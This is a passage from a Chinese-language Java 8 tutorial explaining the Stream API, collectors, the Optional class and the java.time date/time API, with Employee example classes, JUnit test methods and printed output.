中自带的并行流使得并发处理集合的门槛再次降低，使用 Stream API 编程可以非常方便的写出高性能的并发程序。\n\n**Stream 和 Collection 集合的区别：**Collection 是一种静态的内存数据结构，而Stream 是有关计算的。前者是主要面向内存，存储在内存中，后者主要是面向CPU，通过 CPU 实现计算。\n\n在没有 Stream 之前，我们想提取出所有年龄大于18的学生，我们需要这样做：\n\n```java\nList<Student> result=new ArrayList<>();\nfor(Student student:students){\n    if(student.getAge()>18){\n        result.add(student);\n    }\n}\nreturn result;\n```\n\n使用Stream，我们可以参照上面的流程示意图来做，首先产生 Stream，然后 filter 过滤，最后归并到容器中。\n\n```java\nreturn students.stream().filter(s->s.getAge()>18).collect(Collectors.toList());\n```\n\n### **Stream**操作步骤\n\n- 1、创建 Stream\n  - 一个数据源（如：集合、数组），获取一个流\n- 2、中间操作\n  - 一个中间操作链，对数据源的数据进行处理\n- 3、终止操作\n  - 一旦执行终止操作，就执行中间操作链，并产生结果。之后，不会再被使用\n\n### 创建流\n\n在创建 Stream 前，先创建一个 Employee.java，供下面测试使用。\n\n```java\npublic class Employee {\n\n    private int id;\n    private String name;\n    private int age;\n    private double salary;\n\n    public Employee() {\n    }\n\n    public Employee(String name) {\n        this.name = name;\n    }\n    public Employee(Integer id) {\n        this.id = id;\n    }\n    public Employee(Integer id,Integer age) {\n        this.id = id;\n        this.age = age;\n    }\n\n    public Employee(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public Employee(int id, String name, int age, double salary) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public double getSalary() {\n        return salary;\n    }\n\n    public void setSalary(double salary) {\n        this.salary = salary;\n    }\n\n    public String show() {\n        return \"测试方法引用！\";\n    }\n\n    @Override\n    public int hashCode() {\n        final int prime = 31;\n        int result = 1;\n        result = prime * result + age;\n        result = prime * result + id;\n        result = prime * result + ((name == null) ? 0 : name.hashCode());\n        long temp;\n        temp = Double.doubleToLongBits(salary);\n        result = prime * result + (int) (temp ^ (temp >>> 32));\n        return result;\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (this == obj)\n            return true;\n        if (obj == null)\n            return false;\n        if (getClass() != obj.getClass())\n            return false;\n        Employee other = (Employee) obj;\n        if (age != other.age)\n            return false;\n        if (id != other.id)\n            return false;\n        if (name == null) {\n            if (other.name != null)\n                return false;\n        } else if (!name.equals(other.name))\n            return false;\n        if (Double.doubleToLongBits(salary) != Double.doubleToLongBits(other.salary))\n            return false;\n        return true;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee [id=\" + id + \", name=\" + name + \", age=\" + age + \", salary=\" + salary + \"]\";\n    }\n\n}\n```\n\n创建一个测试类 StreamAPI.java，并创建一个 test 方法。所有创建 Stream 的方式都在这个类的 test 方法中。\n\n```java\npublic class StreamaAPI {\n  @Test\n  public void test() {\n\n  }\n}\n```\n\n#### 方式一：通过集合\n\n Java8 中的 Collection 接口被扩展，提供了两个获取流的方法\n\n- **default Stream\\<E> stream() :** 返回一个顺序流\n  - `Collection.stream()`\n\n- **default Stream\\<E> parallelStream() :** 返回一个并行流\n  - `Collection.parallelStream()`\n\n```java\nList<String> list = new ArrayList<>();\nStream<String> stream1 = list.stream();//获取一个顺序流\nStream<String> stream2 = list.parallelStream();//获取一个并行流\n```\n\n#### 方式二：通过数组\n\nJava8 中的 Arrays 的静态方法stream() 可以获取数组流：\n\n- **static \\<T> Stream\\<T> stream(T[] array):** 返回一个流\n  - `Arrays.stream(T array)`\n\n```java\nEmployee[] emps = new Employee[10];\nStream<Employee> stream3 = Arrays.stream(emps);\n```\n\n重载形式，能够处理对应基本类型的数组：\n\n- public static IntStream stream(int[] array)\n\n- public static LongStream stream(long[] array)\n\n- public static DoubleStream stream(double[] array)\n\n#### 方式三：通过**Stream**的**of()**\n\n可以调用Stream类静态方法of(), 通过显示值创建一个流。它可以接收任意数量的参数。\n\n- **public static \\<T> Stream\\<T> of(T... values) :** 返回一个流\n  - `Stream.of()`\n\n```java\nStream<String> stream4 = Stream.of(\"aa\", \"bb\", \"cc\");\nstream4.forEach(System.out::println);\n```\n\n#### 方式四：创建无限流\n\n可以使用静态方法 Stream.iterate() 和Stream.generate()，创建无限流。\n\n- 迭代：**public static \\<T> Stream\\<T> iterate(final T seed, final UnaryOperator\\<T> f)** \n  - `Stream.iterate()` \n\n```java\nStream<Integer> stream5 = Stream.iterate(0, (x) -> x + 2);\nstream5.limit(5).forEach(System.out::println);\n```\n\n- 生成：**public static \\<T> Stream\\<T> generate(Supplier\\<T> s)** \n  - `Stream.generate()`\n\n```java\nStream<Double> stream6 = Stream.generate(() -> Math.random());\nstream6.limit(5).forEach(System.out::println);\n```\n\n### 中间操作\n\n一个流可以后面跟随零个或多个中间操作。其目的主要是打开流，做出某种程度的数据映射/过滤，然后会返回一个新的流，交给下一个操作使用。\n\n多个中间操作可以连接起来形成一个流水线，除非流水线上触发终止操作，否则中间操作不会执行任何的处理！而在终止操作时一次性全部处理，称为“惰性求值”\n\n在中间操作前，先在 StreamAPI.java 中创建一个 Employee 对象的集合，供下面测试使用。\n\n```java\nList<Employee> emps = Arrays.asList(\n  new Employee(102, \"李四\", 59, 6666.66), \n  new Employee(101, \"张三\", 18, 9999.99),\n  new Employee(103, \"王五\", 28, 3333.33), \n  new Employee(104, \"赵六\", 8, 7777.77),\n  new Employee(104, \"赵六\", 8, 7777.77), \n  new Employee(104, \"赵六\", 8, 7777.77),\n  new Employee(105, \"田七\", 38, 5555.55)\n);\n```\n\n#### 筛选/切片\n\n| 方法                    | 描述                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| **filter(Predicate p)** | 接收Lambda ，从流中排除某些元素                              |\n| **distinct()**          | 筛选，通过流所生成元素的hashCode()和equals()去除重复元素     |\n| **limit(long maxSize)** | 截断流，使其元素不超过给定数量                               |\n| **skip(long n)**        | 跳过元素，返回一个扔掉了前n个元素的流。若流中元素不足n个，则返回一个空流。与limit(n) 互补 |\n\n##### filter——过滤\n\n```java\n@Test\npublic void testFilter() {\n  //这里加入了终止操作 ，不然中间操作不会执行\n  emps.stream().filter((e) -> e.getAge() > 18)//年龄大于18岁\n    \t\t\t\t\t .forEach(System.out::println);//终止操作\n}\n\n/**\nEmployee [id=102, name=李四, age=59, salary=6666.66]\nEmployee [id=103, name=王五, age=28, salary=3333.33]\nEmployee [id=105, name=田七, age=38, salary=5555.55]\n**/\n```\n\n##### distinct——去重\n\n```java\n@Test\npublic void testDistinct() {\n  emps.stream().distinct()//去除重复的元素，需要重写hashCode跟equals方法\n    \t\t\t\t\t .forEach(System.out::println);//终止操作\n}\n\n/**\nEmployee [id=102, name=李四, age=59, salary=6666.66]\nEmployee [id=101, name=张三, age=18, salary=9999.99]\nEmployee [id=103, name=王五, age=28, salary=3333.33]\nEmployee [id=104, name=赵六, age=8, salary=7777.77]\nEmployee [id=105, name=田七, age=38, salary=5555.55]\n**/\n```\n\n##### limit——截断流\n\n```java\n@Test\npublic void testLimit() {\n  emps.stream().filter((e) -> e.getAge()> 18)\n               .limit(2)\n    \t\t\t\t\t .forEach(System.out::println);//终止操作\n}\n\n/**\nEmployee [id=102, name=李四, age=59, salary=6666.66]\nEmployee [id=103, name=王五, age=28, salary=3333.33]\n**/\n```\n\n##### skip——跳过元素\n\n```java\n@Test\npublic void testSkip() {\n  emps.stream().filter((e) -> e.getAge() > 18)\n    \t\t\t\t\t .skip(2)//这里可以查找filter过滤后的数据，前两个不要，要后面的，与limit相反\n    \t\t\t\t\t .forEach(System.out::println);//终止操作\n}\n\n/**\nEmployee [id=105, name=田七, age=38, salary=5555.55]\n**/\n```\n\n#### 映射\n\n`map`操作能够将流中的每一个元素映射为另外的元素。\n\n| 方法                                | 描述                                                         |\n| ----------------------------------- | ------------------------------------------------------------ |\n| **map(Function f)**                 | 接收一个函数作为参数，该函数会被应用到每个元素上，并将其映射成一个新的元素。 |\n| **flatMap(Function f)**             | 接收一个函数作为参数，将流中的每个值都换成另一个流，然后把所有流连接成一个流 |\n| **mapToDouble(ToDoubleFunction f)** | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的DoubleStream。 |\n| **mapToInt(ToIntFunction f)**       | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的IntStream。 |\n| **mapToLong(ToLongFunction f)**     | 接收一个函数作为参数，该函数会被应用到每个元素上，产生一个新的LongStream。 |\n\n```java\n\n@Test\npublic void testMapAndflatMap() {\n  List<String> list=Arrays.asList(\"aaa\",\"bbb\");\n  list.stream()\n    .map((str)->str.toUpperCase())//里面是Function\n    .forEach(System.out::println);\n\n  System.out.println(\"======================================\");\n\n  //流中流\n  Stream<Stream<Character>> stream = list.stream()\n    .map(StreamAPI::filterCharacter);\n  //map是一个个流（这个流中有元素）加入流中 {{a,a,a},{b,b,b}}\n  stream.forEach(sm->{\n    sm.forEach(System.out::println);\n  });\n\n  System.out.println(\"=============引进flatMap=============\");\n  \n  //只有一个流\n  Stream<Character> flatMap = list.stream()\n    .flatMap(StreamAPI::filterCharacter);\n  //flatMap是将一个个流中的元素加入流中 {a,a,a,b,b,b}\n  flatMap.forEach(System.out::println);\n}\n\npublic static Stream<Character> filterCharacter(String str){\n  List<Character> list=new ArrayList<>();\n  for (Character character : str.toCharArray()) {\n    list.add(character);\n  }\n  return list.stream();\n}\n```\n\nmap 跟 flatMap的区别     \n\n* 有点跟集合中的 add 和 addAll 方法类似     \n* add 是将无论是元素还是集合，整体加到其中一个集合中去 [1,2,3,[2,3]]    \n* addAll 是将无论是元素还是集合，都是将元素加到另一个集合中去 [1,2,3,2,3]\n* map是**一个个流**（这个流中有元素）加入流中，flatMap是将**一个个流中的元素**加入流中。\n\n#### 排序\n\n| 方法                       | 描述                               |\n| -------------------------- | ---------------------------------- |\n| **sorted()**               | 产生一个新流，其中按自然顺序排序   |\n| **sorted(Comparator com)** | 产生一个新流，其中按比较器顺序排序 |\n\n```java\n@Test\n\tpublic  void  testSorted() {\n\t\tList<String> list=Arrays.asList(\"ccc\",\"aaa\",\"bbb\",\"ddd\",\"eee\");\n\t\tlist.stream().sorted()\n\t\t\t\t     .forEach(System.out::println);\n\n\t\tSystem.out.println(\"=======定制排序=========\");\n\n\t\temps.stream().sorted((x, y) -> {\n\t\t\t\t\tif(x.getAge() == y.getAge()){\n\t\t\t\t\t\treturn x.getName().compareTo(y.getName());\n\t\t\t\t\t}else{\n\t\t\t\t\t\treturn Integer.compare(x.getAge(), y.getAge());\n\t\t\t\t\t}\n\t\t\t\t}).forEach(System.out::println);\n\t}\n```\n\n### 终止操作\n\n终止操作会从流的流水线生成结果。其结果可以是任何不是流的值，例如：List、Integer，甚至是void ，流进行了终止操作后，不能再次使用。\n\n新建了一个Employee2.java，供下面测试使用。\n\n```java\npublic class Employee2 {\n\n    private int id;\n    private String name;\n    private int age;\n    private double salary;\n    private Status status;\n\n    public Employee2() {\n    }\n\n    public Employee2(String name) {\n        this.name = name;\n    }\n\n    public Employee2(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public Employee2(int id, String name, int age, double salary) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n    }\n\n    public Employee2(int id, String name, int age, double salary, Status status) {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n        this.salary = salary;\n        this.status = status;\n    }\n\n    public Status getStatus() {\n        return status;\n    }\n\n    public void setStatus(Status status) {\n        this.status = status;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public double getSalary() {\n        return salary;\n    }\n\n    public void setSalary(double salary) {\n        this.salary = salary;\n    }\n\n    public String show() {\n        return \"测试方法引用！\";\n    }\n\n    @Override\n    public int hashCode() {\n        final int prime = 31;\n        int result = 1;\n        result = prime * result + age;\n        result = prime * result + id;\n        result = prime * result + ((name == null) ? 0 : name.hashCode());\n        long temp;\n        temp = Double.doubleToLongBits(salary);\n        result = prime * result + (int) (temp ^ (temp >>> 32));\n        return result;\n    }\n\n    @Override\n    public boolean equals(Object obj) {\n        if (this == obj)\n            return true;\n        if (obj == null)\n            return false;\n        if (getClass() != obj.getClass())\n            return false;\n        Employee2 other = (Employee2) obj;\n        if (age != other.age)\n            return false;\n        if (id != other.id)\n            return false;\n        if (name == null) {\n            if (other.name != null)\n                return false;\n        } else if (!name.equals(other.name))\n            return false;\n        if (Double.doubleToLongBits(salary) != Double.doubleToLongBits(other.salary))\n            return false;\n        return true;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee2 [id=\" + id + \", name=\" + name + \", age=\" + age + \", salary=\" + salary + \", status=\" + status\n                + \"]\";\n    }\n\n    public enum Status {\n        FREE, BUSY, VOCATION;\n    }\n}\n```\n\n创建一个测试类 TestShutdown.java，test 方法写在里面\n\n```java\npublic class TestShutdown {\n    List<Employee2> emps = Arrays.asList(\n            new Employee2(102, \"李四\", 59, 6666.66, Employee2.Status.BUSY),\n            new Employee2(101, \"张三\", 18, 9999.99, Employee2.Status.FREE),\n            new Employee2(103, \"王五\", 28, 3333.33, Employee2.Status.VOCATION),\n            new Employee2(104, \"赵六\", 8, 7777.77, Employee2.Status.BUSY),\n            new Employee2(104, \"赵六\", 8, 7777.77, Employee2.Status.FREE),\n            new Employee2(104, \"赵六\", 8, 7777.77, Employee2.Status.FREE),\n            new Employee2(105, \"田七\", 38, 5555.55, Employee2.Status.BUSY)\n    );\n  \n    @Test\n    public void test() {\n\n    }\n}\n```\n\n#### 匹配\n\n| 方法                          | 描述                     |\n| ----------------------------- | ------------------------ |\n| **allMatch(Predicate p)**     | 检查是否匹配所有元素     |\n| **anyMatch**(**Predicate p**) | 检查是否至少匹配一个元素 |\n| **noneMatch(Predicate p)**    | 检查是否没有匹配所有元素 |\n\n```java\n@Test\npublic void testMatch(){\n  System.out.println(\"==========allMatch==============\");\n  boolean allMatch = emps.stream().allMatch((e) -> e.getAge() > 5);\n  System.out.println(allMatch);\n\n  System.out.println(\"==========anyMatch==============\");\n  boolean anyMatch = emps.stream().anyMatch((e)->e.getName().equals(\"张三\"));\n  System.out.println(anyMatch);\n\n  System.out.println(\"==========noneMatch=============\");\n  boolean noneMatch = emps.stream().noneMatch((e) -> e.getAge() < 2);//检查是否没有一个小于2\n  System.out.println(noneMatch);\n}\n```\n\n#### 查找\n\n| 方法                    | 描述                                                       |\n| ----------------------- | ---------------------------------------------------------- |\n| **findFirst()**         | 返回第一个元素                                             |\n| **findAny()**           | 返回当前流中的任意元素                                     |\n| **count()**             | 返回流中元素总数                                           |\n| **max(Comparator c)**   | 返回流中最大值                                             |\n| **min(Comparator c)**   | 返回流中最小值                                             |\n| **forEach(Consumer c)** | 内部迭代(使用Collection接口需要用户去做迭代，称为外部迭代) |\n\n```java\n@Test\npublic void  testSearch(){\n  System.out.println(\"==========findFirst==============\");\n  Optional<Employee2> findFirst = emps.stream()\n    .sorted((e1, e2) -> Double.compare(e1.getSalary(), e2.getSalary()))//按照工资排序并输出第一个\n    .findFirst();\n  System.out.println(findFirst);\n\n  System.out.println(\"==========findAny==============\");\n  Optional<Employee2> findAny = emps.stream()\n    .filter((e)->e.getStatus().equals(Employee2.Status.BUSY))\n    .findAny();\n  System.out.println(findAny);\n\n  System.out.println(\"==========count==============\");\n  long count = emps.stream().count();\n  System.out.println(count);\n\n  System.out.println(\"==========max==============\");\n  Optional<Double> max = emps.stream()\n    .map(Employee2::getSalary)\n    .max(Double::compare);\n  System.out.println(max);\n\n  System.out.println(\"==========min==============\");\n  Optional<Employee2> min = emps.stream()\n    .min((e1,e2)->Double.compare(e1.getSalary(), e2.getSalary()));\n  System.out.println(min);\n  \n  System.out.println(\"==========forEach==============\");\n  emps.stream().forEach(System.out::println);\n}\n```\n\n#### 归约\n\n| 方法                                     | 描述                                                     |\n| ---------------------------------------- | -------------------------------------------------------- |\n| **reduce(T identity, BinaryOperator b)** | 可以将流中元素反复结合起来，得到一个值。返回T            |\n| **reduce(BinaryOperator b)**             | 可以将流中元素反复结合起来，得到一个值。返回Optional\\<T> |\n\n- identity : 起始值\n- BinaryOperator : 二元运算\n\n备注：map 和reduce 的连接通常称为map-reduce 模式，因Google 用它来进行网络搜索而出名。\n\n```java\n@Test\npublic void testReduce() {\n  List<Integer> list= Arrays.asList(1,2,3);\n  Integer sum = list.stream().reduce(4,(x,y)->x+y);\n  System.out.println(sum);\n\n  Optional<Integer> sum2 = list.stream().reduce((x, y) -> x+y);\n  System.out.println(sum2.get());\n}\n\n/**\n10\n6\n**/\n```\n\n#### 收集\n\n| 方法                 | 描述                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| collect(Collector c) | 将流转换为其他形式。接收一个Collector接口的实现，用于给Stream中元素做汇总的方法 |\n\nCollector 接口中方法的实现决定了如何对流执行收集的操作(如收集到List、Set、Map)。\n\n另外，Collectors 实用类提供了很多静态方法，可以方便地创建常见收集器实例，具体方法与实例如下表：\n\n![](https://img.jwt1399.top/img/image-20220405000215673.png)\n\n![](https://img.jwt1399.top/img/image-20220405000313618.png)\n\n```java\n@Test\npublic void testCollect1() {\n    System.out.println(\"==========toList==============\");\n    List<String> collect = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toList());\n    collect.forEach(System.out::println);\n\n    System.out.println(\"==========toSet==============\");\n    Set<String> collect2 = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toSet());//set不允许重复\n    collect2.forEach(System.out::println);\n\n    System.out.println(\"==========toCollection==============\");\n    HashSet<String> collect3 = emps.stream()\n      .map(Employee2::getName)\n      .collect(Collectors.toCollection(HashSet::new));\n    collect3.forEach(System.out::println);\n}\n\n/**\n==========toList==============\n李四\n张三\n王五\n赵六\n赵六\n赵六\n田七\n==========toSet==============\n李四\n张三\n王五\n赵六\n田七\n==========toCollection==============\n李四\n张三\n王五\n赵六\n田七\n**/\n```\n\n```java\n@Test\npublic void testCollect2() {\n    System.out.println(\"==========counting==============\");\n    Long collect7 = emps.stream()\n      .collect(Collectors.counting());\n    System.out.println(collect7);\n\n    System.out.println(\"==========summingDouble==============\");\n    Double collect5 = emps.stream()\n      .collect(Collectors.summingDouble(Employee2::getSalary));\n    System.out.println(collect5);\n\n    System.out.println(\"==========averagingDouble==============\");\n    Double collect6 = emps.stream()\n      .collect(Collectors.averagingDouble((e)->e.getSalary()));\n    System.out.println(collect6);\n\n    System.out.println(\"==========summarizingDouble==============\");\n    DoubleSummaryStatistics collect9 = emps.stream()\n      .collect(Collectors.summarizingDouble(Employee2::getSalary));\n    long count = collect9.getCount();\n    double average = collect9.getAverage();\n    double max = collect9.getMax();\n    double min = collect9.getMin();\n    double sum = collect9.getSum();\n    System.out.println(\"count:\"+count);\n    System.out.println(\"average:\"+average);\n    System.out.println(\"max:\"+max);\n    System.out.println(\"min:\"+min);\n    System.out.println(\"sum:\"+sum);\n}\n/**\n==========counting==============\n7\n==========summingDouble==============\n48888.840000000004\n==========averagingDouble==============\n6984.120000000001\n==========summarizingDouble==============\ncount:7\naverage:6984.120000000001\nmax:9999.99\nmin:3333.33\nsum:48888.840000000004\n**/\n```\n\n```java\n@Test\npublic void testCollect3() {\n  //组接字符串\n  System.out.println(\"==========joining==============\");\n  String collect1 = emps.stream()\n    .map((e)->e.getName())\n    .collect(Collectors.joining());\n  System.out.println(collect1);\n\n  System.out.println(\"==========joining2==============\");\n  String collect2 = emps.stream()\n    .map(Employee2::getName)\n    .collect(Collectors.joining(\",\"));\n  System.out.println(collect2);\n\n  System.out.println(\"==========joining3==============\");\n  String collect3 = emps.stream()\n    .map(Employee2::getName)\n    .collect(Collectors.joining(\",\", \"前缀-\", \"-后缀\"));\n  System.out.println(collect3);\n\n\n  System.out.println(\"==========maxBy==============\");\n  Optional<Double> collect4 = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.maxBy(Double::compare));\n  System.out.println(collect4.get());\n\n\n  System.out.println(\"==========minBy==============\");\n  Optional<Double> collect5 = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.minBy(Double::compare));\n  System.out.println(collect5);\n}\n/**\n==========joining==============\n李四张三王五赵六赵六赵六田七\n==========joining2==============\n李四,张三,王五,赵六,赵六,赵六,田七\n==========joining3==============\n前缀-李四,张三,王五,赵六,赵六,赵六,田七-后缀\n==========maxBy==============\n9999.99\n==========minBy==============\nOptional[3333.33]\n**/\n```\n\n```java\n @Test\npublic void testCollect4() {\n  System.out.println(\"==========reducing==============\");\n  Optional<Double> collect = emps.stream()\n    .map(Employee2::getSalary)\n    .collect(Collectors.reducing(Double::sum));\n  System.out.println(collect.get());\n  //分组\n  System.out.println(\"==========groupingBy==============\");\n  Map<Employee2.Status, List<Employee2>> collect2 = emps.stream()\n    .collect(Collectors.groupingBy(Employee2::getStatus));\n  System.out.println(collect2);\n\n  //多级分组\n  System.out.println(\"==========groupingBy2==============\");\n  Map<Employee2.Status, Map<String, List<Employee2>>> collect3 = emps.stream()\n    .collect(Collectors.groupingBy(Employee2::getStatus, Collectors.groupingBy((e)->{\n      if(e.getAge() >= 60) {\n        return \"老年\";\n      } else if(e.getAge() >= 35) {\n        return \"中年\";\n      } else {\n        return \"成年\";\n      }\n    })));\n  System.out.println(collect3);\n  //分区\n  System.out.println(\"==========partitioningBy==============\");\n  Map<Boolean, List<Employee2>> collect4 = emps.stream()\n    .collect(Collectors.partitioningBy((e)->e.getSalary()>5000));\n  System.out.println(collect4);\n}\n/**\n48888.84000000001\n==========groupingBy==============\n{BUSY=[Employee2 [id=102, name=李四, age=59, salary=6666.66, status=BUSY], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=BUSY], Employee2 [id=105, name=田七, age=38, salary=5555.55, status=BUSY]], VOCATION=[Employee2 [id=103, name=王五, age=28, salary=3333.33, status=VOCATION]], FREE=[Employee2 [id=101, name=张三, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE]]}\n==========groupingBy2==============\n{BUSY={成年=[Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=BUSY]], 中年=[Employee2 [id=102, name=李四, age=59, salary=6666.66, status=BUSY], Employee2 [id=105, name=田七, age=38, salary=5555.55, status=BUSY]]}, VOCATION={成年=[Employee2 [id=103, name=王五, age=28, salary=3333.33, status=VOCATION]]}, FREE={成年=[Employee2 [id=101, name=张三, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE]]}}\n==========partitioningBy==============\n{false=[Employee2 [id=103, name=王五, age=28, salary=3333.33, status=VOCATION]], true=[Employee2 [id=102, name=李四, age=59, salary=6666.66, status=BUSY], Employee2 [id=101, name=张三, age=18, salary=9999.99, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=BUSY], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE], Employee2 [id=104, name=赵六, age=8, salary=7777.77, status=FREE], Employee2 [id=105, name=田七, age=38, salary=5555.55, status=BUSY]]}\n**/\n```\n\n## Optional类\n\nOptional 类 (java.util.Optional) 是一个容器类，代表一个值存在或不存在，原来用 null 表示一个值不存在，现在用 Optional 可以更好的表达这个概念；Optional 类主要解决的问题就是空指针异常（NullPointerException）\n\n常用方法：\n\n- Optional.of(T t)：创建一个 Optional 实例\n- Optional.empty(T t)：创建一个空的 Optional 实例\n- Optional.ofNullable(T t)：若 t 不为 null，创建 Optional 实例，否则空实例\n- isPresent()：判断是否包含某值\n- orElse(T t)：如果调用对象包含值，返回该值，否则返回 t\n- orElseGet(Supplier s)：如果调用对象包含值，返回该值，否则返回 s 获取的值\n- map(Function f)：如果有值对其处理，并返回处理后的 Optional，否则返回 Optional.empty()\n- flatmap(Function mapper)：与 map 相似，要求返回值必须是 Optional\n\n```java\n@Test\npublic void test01(){\n    Optional<Employee> op = Optional.of(new Employee());\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.empty();\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.ofNullable(new Employee());\n    Employee employee = op.get();\n  \n    Optional<Employee> op = Optional.ofNullable(new Employee());\n    if (op.isPresent()) {\n        Employee employee = op.get();\n    }\n}\n```\n\n详细请看：[Optional类 - 简书 (jianshu.com)](https://www.jianshu.com/p/58b3f09a3429)\n\n## 新时间日期**API**\n\n### 本地时间/日期\n\n- LocalDate、LocalTime、LocalDateTime 分别表示使用  ISO-8601日历系统的日期、时间、日期和时间。\n\n- 它们提供了简单的日期或时间，并不包含当前的时间信息。也不包含与时区相关的信息。\n\n**常用方法**\n\n![](https://img.jwt1399.top/img/image-20220405180709449.png)\n\n```java\n@Test\npublic void test01(){\n    //获取当前时间日期 now\n    LocalDateTime ldt1 = LocalDateTime.now();\n    System.out.println(ldt1);\n\n    //指定时间日期 of\n    LocalDateTime ldt2 = LocalDateTime.of(2020, 05, 17, 16, 24, 33);\n    System.out.println(ldt2);\n\n    //加 plus\n    LocalDateTime ldt3 = ldt2.plusYears(2);\n    System.out.println(ldt3);\n\n    //减 minus\n    LocalDateTime ldt4 = ldt2.minusMonths(3);\n    System.out.println(ldt4);\n\n    //获取指定的年月日时分秒... get\n    System.out.println(ldt2.getDayOfYear());\n    System.out.println(ldt2.getHour());\n    System.out.println(ldt2.getSecond());\n}\n```\n\n### **Instant**时间戳\n\n它是以 Unix 元年 1970-01-01 00:00:00 到某个时间之间的毫秒值\n\n```java\n@Test\npublic void test02(){\n    // 默认获取 UTC 时区 (UTC：世界协调时间)\n    Instant ins1 = Instant.now();\n    System.out.println(ins1);\n\n    //带偏移量的时间日期 (如：UTC + 8)\n    OffsetDateTime odt1 = ins1.atOffset(ZoneOffset.ofHours(8));\n    System.out.println(odt1);\n\n    //转换成对应的毫秒值\n    long milli1 = ins1.toEpochMilli();\n    System.out.println(milli1);\n\n    //构建时间戳\n    Instant ins2 = Instant.ofEpochSecond(60);\n    System.out.println(ins2);\n}\n```\n\n### 时间差/日期差\n\n- Duration:用于计算两个“时间”间隔\n\n- Period:用于计算两个“日期”间隔\n\n```java\n@Test\npublic void test03(){\n    //计算两个时间之间的间隔 between\n    Instant ins1 = Instant.now();\n    try {\n        Thread.sleep(1000);\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n    Instant ins2 = Instant.now();\n    Duration dura1 = Duration.between(ins1, ins2);\n    System.out.println(dura1.getSeconds());\n    System.out.println(dura1.toMillis());\n}\n\n@Test\npublic void test04(){\n    LocalDate ld1 = LocalDate.of(2016, 9, 1);\n    LocalDate ld2 = LocalDate.now();\n    Period period = Period.between(ld1, ld2);  // ISO 标准\n    System.out.println(period.getYears());\n    System.out.println(period.toTotalMonths());\n}\n```\n\n### 时间校正器\n\n- TemporalAdjuster：时间校正器。有时我们可能需要获取例如：将日期调整到“下个周日”等操作。\n\n- TemporalAdjusters：该类通过静态方法提供了大量的常用TemporalAdjuster的实现。\n\n```java\n@Test\npublic void test01(){\n    //TemporalAdjusters：时间校正器\n    LocalDateTime ldt1 = LocalDateTime.now();\n    System.out.println(ldt1);\n\n    //指定日期时间中的 年 月 日 ...\n    LocalDateTime ldt2 = ldt1.withDayOfMonth(10);\n    System.out.println(ldt2);\n\n    //指定时间校正器\n    LocalDateTime ldt3 = ldt1.with(TemporalAdjusters.next(DayOfWeek.SUNDAY));\n    System.out.println(ldt3);\n\n    //自定义时间校正器\n    LocalDateTime ldt5 = ldt1.with((ta) -> {\n        LocalDateTime ldt4 = (LocalDateTime) ta;\n        DayOfWeek dow1 = ldt4.getDayOfWeek();\n        if (dow1.equals(DayOfWeek.FRIDAY)) {\n            return ldt4.plusDays(3);\n        } else if (dow1.equals(DayOfWeek.SATURDAY)) {\n            return ldt4.plusDays(2);\n        } else {\n            return ldt4.plusDays(1);\n        }\n    });\n    System.out.println(ldt5);\n}\n```\n\n### 解析与格式化\n\n- DateTimeFormatter：格式化时间 / 日期\n\n```java\n@Test\npublic void test01(){\n    //默认格式化\n    DateTimeFormatter dtf1 = DateTimeFormatter.ISO_DATE_TIME;\n    LocalDateTime ldt1 = LocalDateTime.now();\n    String str1 = ldt1.format(dtf1);\n    System.out.println(str1);\n\n    //自定义格式化 ofPattern\n    DateTimeFormatter dtf2 = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n    LocalDateTime ldt2 = LocalDateTime.now();\n    String str2 = ldt2.format(dtf2);\n    System.out.println(str2);\n\n    //解析\n    LocalDateTime newDate = ldt1.parse(str1, dtf1);\n    System.out.println(newDate);\n}\n\n```\n\n### 时区\n\n- ZonedDate 、ZonedTime、ZonedDateTime 分别为带时区的日期、时间、日期和时间。\n\n```java\n@Test\npublic void test02(){\n    //查看支持的时区\n    Set<String> set = ZoneId.getAvailableZoneIds();\n    set.forEach(System.out::println);\n\n    //指定时区\n    LocalDateTime ldt1 = LocalDateTime.now(ZoneId.of(\"Europe/Tallinn\"));\n    System.out.println(ldt1);\n  \n    // 上海时间\n    ZoneId shanghaiZoneId = ZoneId.of(\"Asia/Shanghai\");\n    ZonedDateTime shanghaiZonedDateTime = ZonedDateTime.now(shanghaiZoneId);\n\n    